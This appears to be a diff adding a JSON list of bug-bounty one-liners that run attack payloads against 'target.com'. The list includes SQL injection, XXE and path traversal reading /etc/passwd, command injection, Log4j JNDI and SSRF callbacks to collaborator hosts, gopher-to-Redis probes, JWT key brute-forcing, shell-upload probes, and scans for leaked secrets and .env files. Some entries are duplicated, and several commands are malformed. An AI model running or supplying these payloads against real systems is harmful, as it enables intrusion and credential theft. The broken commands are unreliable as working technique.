+    "command": "cat all_urls.txt | gf login | qsreplace 'sessionid=1234abcd' | httpx -silent -fr '1234abcd' -o session_fixation.txt"
+  },
+  {
+    "title": "Exposed .env Files (Sensitive Config Exposure)",
+    "command": "subfinder -d target.com | httpx -silent -path /.env -mc 200 -o exposed_env.txt"
+  },
+  {
+    "title": "SSRF Detection (Collaboration Automation)",
+    "command": "cat all_urls.txt | gf ssrf | qsreplace 'http://your-collab-url.burpcollaborator.net' | httpx -silent"
+  },
+  {
+    "title": "CRLF Injection",
+    "command": "cat all_urls.txt | gf crlf | qsreplace '%0D%0ASet-Cookie:crlf=found' | httpx -silent -fr 'crlf=found' -o crlf_injections.txt"
+  },
+  {
+    "title": "CMS Detection (for Known Exploits)",
+    "command": "subfinder -d target.com | httpx -silent -tech-detect -o cms_detected.txt"
+  },
+  {
+    "title": "Missing Security Headers (Easy Win)",
+    "command": "cat all_urls.txt | httpx -silent -H 'X-Content-Type-Options' -H 'X-Frame-Options' -H 'Content-Security-Policy' -H 'Strict-Transport-Security' | grep -E \"missing|absent\" | tee weak_headers.txt"
+  },
+  {
+    "title": "Cache Poisoning Detection",
+    "command": "cat all_urls.txt | gf cache | qsreplace 'X-Forwarded-Host: evil.com' | httpx -silent -fr 'evil.com' -o cache_poisoning.txt"
+  },
+  {
+    "title": "Client-Side Prototype Pollution",
+    "command": "cat all_js_urls.txt | xargs -I{} curl -s {} | grep -E 'prototype|__proto__|constructor' | tee client_side_prototype.txt"
+  },
+  {
+    "title": "Sensitive Image Exposures (Backups/Logs)",
+    "command": "subfinder -d target.com | httpx -silent -path-list <(echo -e '/backup.jpg\\n/screenshot.png\\n/db-dump.png\\n/log.png') -mc 200 -o exposed_images.txt"
+  },
+  {
+    "title": "BONUS — Full Recon Workflow One-Liner",
+    "command": "subfinder -d target.com | httpx -silent -title -tech-detect | nuclei -silent -t vulnerabilities/ -o all_findings.txt"
+  },
+  {
+    "title": "Log4j Vulnerability Scanner (JNDI Injection)",
+    "command": "cat all_urls.txt | qsreplace '${jndi:ldap://your-collab-url.burpcollaborator.net/a}' | httpx -silent -o log4j_candidates.txt"
+  },
+  {
+    "title": "AWS S3 Bucket Takeover (Misconfigured Buckets)",
+    "command": "subfinder -d target.com | sed 's/$/.s3.amazonaws.com/' | httpx -silent -mc 200 -o open_buckets.txt"
+  },
+  {
+    "title": "JWT Secrets Brute Force (Weak Signing Key)",
+    "command": "cat jwt_tokens.txt | jwt-cracker -w wordlist.txt -t 50 -o weak_jwt_keys.txt"
+  },
+  {
+    "title": "CORS Misconfiguration Finder",
+    "command": "cat all_urls.txt | httpx -silent -H 'Origin: https://evil.com' -hdrs | grep -E \"Access-Control-Allow-Origin: \\*|Access-Control-Allow-Origin: https://evil.com\" | tee cors_vulns.txt"
+  },
+  {
+    "title": "GCP Bucket Enumeration (Google Cloud)",
+    "command": "subfinder -d target.com | sed 's/$/.storage.googleapis.com/' | httpx -silent -mc 200 -o open_gcp_buckets.txt"
+  },
+  {
+    "title": "Python Pickle Injection Check (Deserialization Bug)",
+    "command": "cat all_urls.txt | gf deserialize | qsreplace 'evil_pickle_payload_here' | httpx -silent -o pickle_vulns.txt"
+  },
+  {
+    "title": "SQL Injection (Error-Based Detection)",
+    "command": "cat all_urls.txt | gf sqli | qsreplace \"' OR 1=1 --\" | httpx -silent -fr 'syntax|sql|error|database' -o sql_injection.txt"
+  },
+  {
+    "title": "Version Disclosure Detection",
+    "command": "cat all_urls.txt | httpx -silent -hdrs | grep -Ei 'server:|x-powered-by:' | tee version_disclosures.txt"
+  },
+  {
+    "title": "CRLF Injection with Cookie Injection Check",
+    "command": "cat all_urls.txt | gf crlf | qsreplace '%0d%0aSet-Cookie:+crlf=found' | httpx -silent -fr 'crlf=found' -o crlf_cookie_injection.txt"
+  },
+  {
+    "title": "Directory Traversal Finder",
+    "command": "cat all_urls.txt | qsreplace '../../etc/passwd' | httpx -silent -fr 'root:x' -o dir_traversal.txt"
+  },
+  {
+    "title": "Azure Storage Enumeration",
+    "command": "subfinder -d target.com | sed 's/$/.blob.core.windows.net/' | httpx -silent -mc 200 -o open_azure_blobs.txt"
+  },
+  {
+    "title": "Subdomain Takeover Detection (CNAME Pointing to Unclaimed Services)",
+    "command": "subfinder -d target.com | dnsx -silent -a -resp-only | nuclei -silent -t takeover-detection/ -o takeover_candidates.txt"
+  },
+  {
+    "title": "Unauthorized Admin Panel Access",
+    "command": "cat all_urls.txt | httpx -silent -path-list <(echo -e '/admin\\n/dashboard\\n/cms\\n/panel\\n/root\\n/console') -mc 200 -o exposed_admins.txt"
+  },
+  {
+    "title": "IPv6 Asset Discovery (Many Orgs Forget This)",
+    "command": "subfinder -d target.com | dnsx -silent -aaaa -resp-only | tee ipv6_assets.txt"
+  },
+  {
+    "title": "Template Injection Finder (SSTI)",
+    "command": "cat all_urls.txt | gf ssti | qsreplace '{{7*7}}' | httpx -silent -fr '49' -o ssti_vulns.txt"
+  },
+  {
+    "title": "Open Redirect Detection",
+    "command": "cat all_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'Location: https://evil.com' -o open_redirects.txt"
+  },
+  {
+    "title": "Server-Side Request Forgery (SSRF)",
+    "command": "cat all_urls.txt | gf ssrf | qsreplace 'http://your-burpcollab-url.burpcollaborator.net' | httpx -silent -o ssrf_candidates.txt"
+  },
+  {
+    "title": "Exposed .git Repositories (Code Leakage)",
+    "command": "cat subdomains.txt | httpx -silent -path '/.git/config' -mc 200 -o exposed_git_repos.txt"
+  },
+  {
+    "title": "Command Injection Finder",
+    "command": "cat all_urls.txt | gf cmd-injection | qsreplace '&& id' | httpx -silent -fr 'uid=' -o cmd_injection.txt"
+  },
+  {
+    "title": "Prototype Pollution Detection",
+    "command": "cat all_urls.txt | qsreplace '__proto__[exploit]=polluted' | httpx -silent -fr 'polluted' -o prototype_pollution.txt"
+  },
+  {
+    "title": "Email/PII Leakage in Responses",
+    "command": "cat all_urls.txt | httpx -silent -fr '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' -o leaked_emails.txt"
+  },
+  {
+    "title": "Host Header Injection",
+    "command": "cat all_urls.txt | httpx -silent -H 'Host: attacker.com' -fr 'attacker.com' -o host_header_injection.txt"
+  },
+  {
+    "title": "Path Traversal (Windows)",
+    "command": "cat all_urls.txt | qsreplace 'C:/Windows/win.ini' | httpx -silent -fr 'for 16-bit app support' -o windows_traversal.txt"
+  },
+  {
+    "title": "Sensitive Files (Backup Files Exposure)",
+    "command": "cat subdomains.txt | httpx -silent -path-list <(echo -e '/.env\\n/config.php.bak\\n/database.yml\\n/backup.zip') -mc 200 -o sensitive_files.txt"
+  },
+  {
+    "title": "Exposed Config Panels (CMS, Jenkins, PhpMyAdmin)",
+    "command": "cat subdomains.txt | httpx -silent -path-list <(echo -e '/phpmyadmin\\n/jenkins\\n/wp-admin\\n/admin\\n/cpanel') -mc 200 -o exposed_panels.txt"
+  },
+  {
+    "title": "Hardcoded API Keys in JS Files",
+    "command": "cat all_js_urls.txt | xargs -I{} curl -s {} | grep -E 'apiKey|apikey|secret|token|bearer' | tee hardcoded_api_keys.txt"
+  },
+  {
+    "title": "Spring Boot Actuator Exposed Endpoints",
+    "command": "cat subdomains.txt | httpx -silent -path '/actuator/health' -mc 200 -o exposed_actuators.txt"
+  },
+  {
+    "title": "Gopher SSRF (Redis/SMTP Attack)",
+    "command": "cat all_urls.txt | qsreplace 'gopher://127.0.0.1:6379/_COMMAND' | httpx -silent -o gopher_ssrf_candidates.txt"
+  },
+  {
+    "title": "HTML Injection (Reflected)",
+    "command": "cat all_urls.txt | gf xss | qsreplace '<h1>PWNED</h1>' | httpx -silent -fr '<h1>PWNED</h1>' -o html_injection.txt"
+  },
+  {
+    "title": "API Token Misconfiguration (Bearer Token Disclosure)",
+    "command": "cat all_urls.txt | httpx -silent -hdrs | grep -i 'authorization: Bearer' | tee bearer_tokens.txt"
+  },
+  {
+    "title": "WordPress Plugin Vulnerabilities (Outdated Plugins)",
+    "command": "nuclei -l subdomains.txt -t cves/wordpress/ -o wp_vulns.txt"
+  },
+  {
+    "title": "Broken Link Hijacking (Subdomain Takeover via Broken Links)",
+    "command": "cat subdomains.txt | gau | grep -E '\\.(js|css|png|jpg|jpeg|gif|svg|woff|ttf|ico)' | httpx -silent -status-code -o broken_links.txt"
+  },
+  {
+    "title": "CRLF Injection (HTTP Response Splitting)",
+    "command": "cat all_urls.txt | qsreplace '%0d%0aSet-Cookie:crlftest=crlfpoc' | httpx -silent -fr 'crlftest=crlfpoc' -o crlf_injection.txt"
+  },
+  {
+    "title": "Cloud Storage Misconfig (AWS S3 Bucket Public Access)",
+    "command": "cat subdomains.txt | nuclei -t misconfiguration/ -o s3_buckets.txt"
+  },
+  {
+    "title": "HTTP Method Fuzzing (Check PUT/DELETE enabled)",
+    "command": "cat subdomains.txt | httpx -silent -methods PUT,DELETE -mc 200 -o risky_methods.txt"
+  },
+  {
+    "title": "GraphQL Misconfig (Introspection Enabled)",
+    "command": "cat subdomains.txt | httpx -silent -path '/graphql' -mc 200 -fr 'Introspection Query' -o graphql_introspection.txt"
+  },
+  {
+    "title": "DNS Zone Transfer (AXFR Check)",
+    "command": "for domain in $(cat subdomains.txt); do dig axfr $domain @ns1.$domain; done"
+  },
+  {
+    "title": "CSP Bypass/Weak CSP Check",
+    "command": "cat subdomains.txt | nuclei -t security-misconfiguration/csp-missing.yaml -o weak_csp.txt"
+  },
+  {
+    "title": "Backup Files (Git, SQL Dumps, Zip Archives)",
+    "command": "cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.sql\\n/.git/config\\n/backup.zip') -mc 200 -o backup_leaks.txt"
+  },
+  {
+    "title": "Session Fixation (Check if sessionID can be set)",
+    "command": "cat all_urls.txt | qsreplace 'sessionid=abc123' | httpx -silent -fr 'sessionid=abc123' -o session_fixation.txt"
+  },
+  {
+    "title": "JWT Secret Bruteforce (Weak Signing Keys)",
+    "command": "cat subdomains.txt | jwt_tool -I -bruteforce wordlist.txt -o weak_jwt_keys.txt"
+  },
+  {
+    "title": "Exposed Email Addresses in Webpages",
+    "command": "cat all_urls.txt | httpx -silent -fr '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' -o leaked_emails.txt"
+  },
+  {
+    "title": "XML External Entity Injection (XXE)",
+    "command": "cat all_urls.txt | gf xxe | qsreplace '<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>' | httpx -silent -fr 'root:x' -o xxe_poc.txt"
+  },
+  {
+    "title": "Exposed Directory Listings (Misconfig)",
+    "command": "cat subdomains.txt | httpx -silent -path '/' -fr 'Index of' -o open_dirs.txt"
+  },
+  {
+    "title": "Kubernetes Dashboard Exposure",
+    "command": "cat subdomains.txt | httpx -silent -path '/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/' -mc 200 -o exposed_k8s_dashboard.txt"
+  },
+  {
+    "title": "Exposed Swagger API (Public API Docs)",
+    "command": "cat subdomains.txt | httpx -silent -path '/swagger-ui.html' -mc 200 -o exposed_swagger.txt"
+  },
+  {
+    "title": "Open Redirect Detection",
+    "command": "cat all_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirects.txt"
+  },
+  {
+    "title": "Directory Traversal (../ Exploit)",
+    "command": "cat all_urls.txt | gf lfi | qsreplace '../etc/passwd' | httpx -silent -fr 'root:x' -o directory_traversal.txt"
+  },
+  {
+    "title": "Server-Side Template Injection (SSTI)",
+    "command": "cat all_urls.txt | gf ssti | qsreplace '{{7*7}}' | httpx -silent -fr '49' -o ssti_found.txt"
+  },
+  {
+    "title": "Insecure Cross-Origin Resource Sharing (CORS)",
+    "command": "cat subdomains.txt | httpx -silent -H \"Origin: https://evil.com\" -fr 'https://evil.com' -o weak_cors.txt"
+  },
+  {
+    "title": "SQL Injection - Quick Payload Fire",
+    "command": "cat all_urls.txt | gf sqli | qsreplace \"' OR '1'='1\" | httpx -silent -fr 'error' -o sqli_poc.txt"
+  },
+  {
+    "title": "Backup Config Files (env/config.php)",
+    "command": "cat subdomains.txt | httpx -silent -path-list <(echo -e '/.env\\n/config.php\\n/settings.py\\n/config.json') -mc 200 -o leaked_configs.txt"
+  },
+  {
+    "title": "SSRF (Server-Side Request Forgery)",
+    "command": "cat all_urls.txt | gf ssrf | qsreplace 'http://burpcollaborator.net' | httpx -silent -o ssrf_candidates.txt"
+  },
+  {
+    "title": "File Upload (Potential Upload Endpoints)",
+    "command": "cat all_urls.txt | gf upload | httpx -silent -mc 200 -o upload_endpoints.txt"
+  },
+  {
+    "title": "Sensitive Data Exposure (Credit Card, API Keys)",
+    "command": "cat all_urls.txt | httpx -silent -fr 'sk_live|pk_live|eyJhbGci|-----BEGIN PRIVATE KEY-----|4[0-9]{12}(?:[0-9]{3})?' -o sensitive_data.txt"
+  },
+  {
+    "title": "JWT Token Leak (in URL or Response)",
+    "command": "cat all_urls.txt | httpx -silent -fr 'eyJ' -o jwt_leaks.txt"
+  },
+  {
+    "title": "Exposed Database Panels (phpMyAdmin, Mongo, etc)",
+    "command": "cat subdomains.txt | httpx -silent -path-list <(echo -e '/phpmyadmin/\\n/admin/\\n/mongo-express/') -mc 200 -o exposed_db_panels.txt"
+  },
+  {
+    "title": "GIT Repo Exposure",
+    "command": "cat subdomains.txt | httpx -silent -path '/.git/config' -mc 200 -o exposed_git.txt"
+  },
+  {
+    "title": "Debug Pages (dev.php/test.php)",
+    "command": "cat subdomains.txt | httpx -silent -path-list <(echo -e '/test.php\\n/dev.php\\n/debug.php') -mc 200 -o debug_pages.txt"
+  },
+  {
+    "title": "Exposed API Keys in JavaScript Files",
+    "command": "cat subdomains.txt | gau | grep '\\.js$' | httpx -silent -fr 'AIza|sk_live|ghp_' -o api_key_leaks.txt"
+  },
+  {
+    "title": "Unsafe File Upload (PHP Reverse Shell Upload)",
+    "command": "cat upload_endpoints.txt | qsreplace 'file=shell.php' | httpx -silent -mc 200 -o shell_upload.txt"
+  },
+  {
+    "title": "Clickjacking (Missing X-Frame-Options)",
+    "command": "cat subdomains.txt | httpx -silent -header 'X-Frame-Options' -o missing_xfo.txt"
+  },
+  {
+    "title": "HTTP Parameter Pollution (Duplicate Params)",
+    "command": "cat all_urls.txt | qsreplace 'param1=value1&param1=value2' | httpx -silent -mc 200 -o hpp_candidates.txt"
+  },
+  {
+    "title": "Server Info Disclosure (Version Leaks)",
+    "command": "cat subdomains.txt | httpx -silent -sc -title -o server_versions.txt"
+  },
+  {
+    "title": "Password Reset Token Leak in URL",
+    "command": "cat all_urls.txt | grep -i 'reset' | grep -E 'token=|key=' | httpx -silent -o reset_token_leak.txt"
+  },
+  {
+    "title": "Host Header Injection",
+    "command": "cat subdomains.txt | httpx -silent -H \"Host: attacker.com\" -fr \"attacker.com\" -o host_header_injection.txt"
+  },
+  {
+    "title": "Web Cache Poisoning",
+    "command": "cat all_urls.txt | qsreplace 'X-Original-URL: /evil' | httpx -silent -fr 'evil' -o cache_poisoning.txt"
+  },
+  {
+    "title": "AWS Bucket Takeover (S3)",
+    "command": "cat subdomains.txt | awk -F. '{print $1\".\"$2}' | while read domain; do aws s3 ls s3://$domain --no-sign-request; done"
+  },
+  {
+    "title": "Exposed Secret Tokens in Robots.txt",
+    "command": "cat subdomains.txt | httpx -silent -path /robots.txt -fr 'token|key|secret' -o secret_leak_robots.txt"
+  },
+  {
+    "title": "Email Injection in Contact Forms",
+    "command": "cat contact_forms_urls.txt | qsreplace 'email=attacker%0A%0DCC%3Aevil@attacker.com' | httpx -silent -mc 200 -o email_injection.txt"
+  },
+  {
+    "title": "PHP Info Disclosure (info.php)",
+    "command": "cat subdomains.txt | httpx -silent -path /info.php -mc 200 -o phpinfo_exposed.txt"
+  },
+  {
+    "title": "Debug Endpoints Exposure (Spring Boot Actuator)",
+    "command": "cat subdomains.txt | httpx -silent -path-list <(echo -e '/actuator/health\\n/actuator/env\\n/actuator/mappings') -mc 200 -o exposed_actuator.txt"
+  },
+  {
+    "title": "Directory Listing Enabled",
+    "command": "cat subdomains.txt | httpx -silent -path '/' -fr 'Index of' -o directory_listing.txt"
+  },
+  {
+    "title": "Kubernetes Dashboard Exposure",
+    "command": "cat subdomains.txt | httpx -silent -path '/#/login' -mc 200 -o kube_dashboard_exposed.txt"
+  },
+  {
+    "title": "Log File Exposure (access.log, error.log)",
+    "command": "cat subdomains.txt | httpx -silent -path-list <(echo -e '/access.log\\n/error.log') -mc 200 -o exposed_logs.txt"
+  },
+  {
+    "title": "Backup Files in Root (zip, tar, sql)",
+    "command": "cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\\n/db.sql\\n/site.tar.gz') -mc 200 -o backup_files.txt"
+  },
+  {
+    "title": "Insecure Direct Object Reference (IDOR)",
+    "command": "cat idor_urls.txt | qsreplace 'user_id=123' | httpx -silent -mc 200 -o idor_candidates.txt"
+  },
+  {
+    "title": "CSP Bypass (Missing or Weak CSP)",
+    "command": "cat subdomains.txt | httpx -silent -H 'Content-Security-Policy' -o weak_csp.txt"
+  },
+  {
+    "title": "Open API Endpoints Discovery",
+    "command": "cat subdomains.txt | httpx -silent -path /swagger.json -mc 200 -o swagger_exposed.txt"
+  },
+  {
+    "title": "OAuth Token Leak in URLs",
+    "command": "cat all_urls.txt | grep -i 'access_token=' -o oauth_token_leaks.txt"
+  },
+  {
+    "title": "GraphQL Endpoint Discovery",
+    "command": "cat subdomains.txt | httpx -silent -path /graphql -mc 200 -o graphql_found.txt"
+  },
+  {
+    "title": "Prototype Pollution via Params",
+    "command": "cat all_urls.txt | qsreplace '__proto__[test]=polluted' | httpx -silent -fr 'polluted' -o prototype_pollution.txt"
+  },
+  {
+    "title": "WordPress XML-RPC Abuse",
+    "command": "cat subdomains.txt | httpx -silent -path /xmlrpc.php -mc 200 -o xmlrpc_found.txt"
+  },
+  {
+    "title": "💻 Ultimate Bug Bounty One-Liners - Part 4\n\n**Find API Endpoints Directly from Web Responses**",
+    "command": "curl -s https://target.com | grep -oE 'https?://[^\"]+/api/[^\"]+' | sort -u"
+  }
+]
